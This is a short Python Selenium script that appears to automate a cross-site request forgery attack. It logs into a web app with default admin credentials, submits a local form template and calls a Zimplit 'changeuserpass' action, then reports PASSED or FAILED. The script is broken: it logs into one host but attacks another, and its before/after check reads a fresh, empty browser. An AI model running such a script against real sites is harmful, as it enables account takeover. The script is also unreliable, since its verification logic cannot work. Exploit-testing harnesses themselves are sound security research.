import os
from phase4lib import check_login, update_results
from selenium import webdriver

browser = webdriver.Firefox("")
# Login to the website 
url = 'https://app4.com/'
browser.get(url)
browser.find_element_by_name('username').send_keys('admin@admin.com')
browser.find_element_by_name('password').send_keys('admin')
browser.find_element_by_xpath("//input[@type='submit']").submit()

# start executing

cur = os.getcwd()
browser.get(cur + "/formtemplate_0.html")
browser.find_element_by_xpath("//input[@type='submit' and @value='Submit']").submit()
injection_url = 'https://app6.com/zimplit.php?action=changeuserpass'
browser.get(injection_url)
before = browser.page_source
browser.quit()

## Verification phase
browser = webdriver.Firefox("")

cur_url = browser.current_url
after = browser.page_source
outstr = "\Exploit URL: " + url + " "
if before != after:
	print '### PASSED ###'
	update_results(outstr + " PASSED\n")
else:
	print '### FAILED ###'
	update_results(outstr + " FAILED\n")

browser.quit()
